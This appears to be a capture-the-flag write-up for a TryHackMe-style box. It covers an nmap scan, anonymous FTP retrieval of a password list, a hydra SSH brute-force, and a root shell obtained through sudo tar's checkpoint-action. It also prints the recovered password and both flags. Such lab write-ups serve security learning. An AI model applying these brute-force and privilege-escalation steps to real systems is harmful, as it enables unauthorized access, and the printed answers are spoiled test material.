1. Scan with `nmap`

```bash
nmap -p- -T4 -sV --min-rate 5000 -o bounty_hunter 10.10.68.134
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-25 03:44 -03
Nmap scan report for 10.10.68.134
Host is up (0.24s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.33 seconds
```

2. Lets connect to the ftp server with anonymous login

```bash
ftp 10.10.68.134
```

Now once inside ftp, lets remove the passive mode

```
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp>
```

Download bot files with `get <file_name>`

And once in the host cat them

```
[Aug 25, 2024 - 03:51:13 (-03)] exegol-default /workspace # cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
[Aug 25, 2024 - 03:51:15 (-03)] exegol-default /workspace # cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

## Who wrote the task list? 

The task list was written by `lin`.

## What service can you bruteforce with the text file found?

Seeing the task list, we can bruteforce it with `ssh`

## What is the users password?

So the user is `link`

Passwords are in the `lock.txt`

We can do the following `hydra -l lin -P locks.txt ssh://10.10.68.134`

```bash
[22][ssh] host: 10.10.68.134   login: lin   password: RedDr4gonSynd1cat3
```

## User FLAG

```
ssh lin@10.10.68.134
The authenticity of host '10.10.68.134 (10.10.68.134)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.68.134' (ED25519) to the list of known hosts.
lin@10.10.68.134's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
lin@bountyhacker:~/Desktop$
```

## Root FLAG

```bash
lin@bountyhacker:~$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
#
```

## Links

- https://gtfobins.github.io/gtfobins/tar/